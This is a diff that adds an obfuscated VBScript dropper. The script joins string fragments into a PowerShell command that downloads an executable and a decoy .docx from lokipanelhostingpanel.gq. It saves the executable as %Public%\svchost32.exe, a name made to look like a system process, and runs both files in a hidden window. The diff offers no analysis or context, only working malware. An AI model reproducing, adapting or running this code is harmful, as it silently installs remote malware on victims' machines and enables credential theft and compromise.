@@ -1,0 +1,83 @@
+set AlWhaWu8AmxahJAs = CreateObject("WScript.Shell")
+   Dim Al89AwnAmxahJAs1
+   Dim Al89AwnAmxahJAs2
+   Dim Al89AwnAmxahJAs3
+   Dim Al89AwnAmxahJAs4
+   Dim Al89AwnAmxahJAs5
+   Dim Al89AwnAmxahJAs6
+   Dim Al89AwnAmxahJAs7
+   Dim Al89AwnAmxahJAs8
+   Dim Al89AwnAmxahJAs9
+   Dim Al89AwnAmxahJAs010
+   Dim Al89AwnAmxahJAs011
+   Dim Al89AwnAmxahJAs012
+   Dim Al89AwnAmxahJAs013
+   Dim Al89AwnAmxahJAs014
+
+ 
+   
+Al89AwnAmxahJAs1 = "PowerShel"
+Al89AwnAmxahJAs2 = "l (New-Ob"
+Al89AwnAmxahJAs3 = "ject Syst"
+Al89AwnAmxahJAs4 = "em.Net.We"
+Al89AwnAmxahJAs5 = "bClient)."
+Al89AwnAmxahJAs6 = "DownloadF"
+Al89AwnAmxahJAs7 = "ile('http://lokipanelhostingpanel.gq/work/go/1s.exe',"
+Al89AwnAmxahJAs8 = "'%Public%\s"
+Al89AwnAmxahJAs9 = "vchost32."
+Al89AwnAmxahJAs010 = "exe');S"
+Al89AwnAmxahJAs011 = "tart-Pr"
+Al89AwnAmxahJAs012 = "ocess '%"
+Al89AwnAmxahJAs013 = "Public%\sv"
+Al89AwnAmxahJAs014 = "chost32.exe'"
+
+
+	
+Al89AwnAmxahJAs20 = Al89AwnAmxahJAs1 + Al89AwnAmxahJAs2 + Al89AwnAmxahJAs3 + Al89AwnAmxahJAs4 + Al89AwnAmxahJAs5 + Al89AwnAmxahJAs6 + Al89AwnAmxahJAs7 + Al89AwnAmxahJAs8 + Al89AwnAmxahJAs9 + Al89AwnAmxahJAs010 + Al89AwnAmxahJAs011 + Al89AwnAmxahJAs012 + Al89AwnAmxahJAs013 + Al89AwnAmxahJAs014
+
+
+    AlWhaWu8AmxahJAs.run Al89AwnAmxahJAs20, vbHide
+
+set smSjiasdAjismdASdhis = CreateObject("WScript.Shell")
+   Dim AAsdjAsdn1
+   Dim AAsdjAsdn2
+   Dim AAsdjAsdn3
+   Dim AAsdjAsdn4
+   Dim AAsdjAsdn5
+   Dim AAsdjAsdn6
+   Dim AAsdjAsdn7
+   Dim AAsdjAsdn8
+   Dim AAsdjAsdn9
+   Dim AAsdjAsdn010
+   Dim AAsdjAsdn011
+   Dim AAsdjAsdn012
+   Dim AAsdjAsdn013
+   Dim AAsdjAsdn014
+
+ 
+   
+AAsdjAsdn1 = "PowerShel"
+AAsdjAsdn2 = "l (New-Ob"
+AAsdjAsdn3 = "ject Syst"
+AAsdjAsdn4 = "em.Net.We"
+AAsdjAsdn5 = "bClient)."
+AAsdjAsdn6 = "DownloadF"
+AAsdjAsdn7 = "ile('http://lokipanelhostingpanel.gq/work/go/1.docx',"
+AAsdjAsdn8 = "'%Public%\s"
+AAsdjAsdn9 = "vchost32."
+AAsdjAsdn010 = "docx');S"
+AAsdjAsdn011 = "tart-Pr"
+AAsdjAsdn012 = "ocess '%"
+AAsdjAsdn013 = "Public%\sv"
+AAsdjAsdn014 = "chost32.docx'"
+
+
+	
+AAsdjAsdn20 = AAsdjAsdn1 + AAsdjAsdn2 + AAsdjAsdn3 + AAsdjAsdn4 + AAsdjAsdn5 + AAsdjAsdn6 + AAsdjAsdn7 + AAsdjAsdn8 + AAsdjAsdn9 + AAsdjAsdn010 + AAsdjAsdn011 + AAsdjAsdn012 + AAsdjAsdn013 + AAsdjAsdn014
+
+
+    smSjiasdAjismdASdhis.run AAsdjAsdn20, vbHide
+
+
+
+
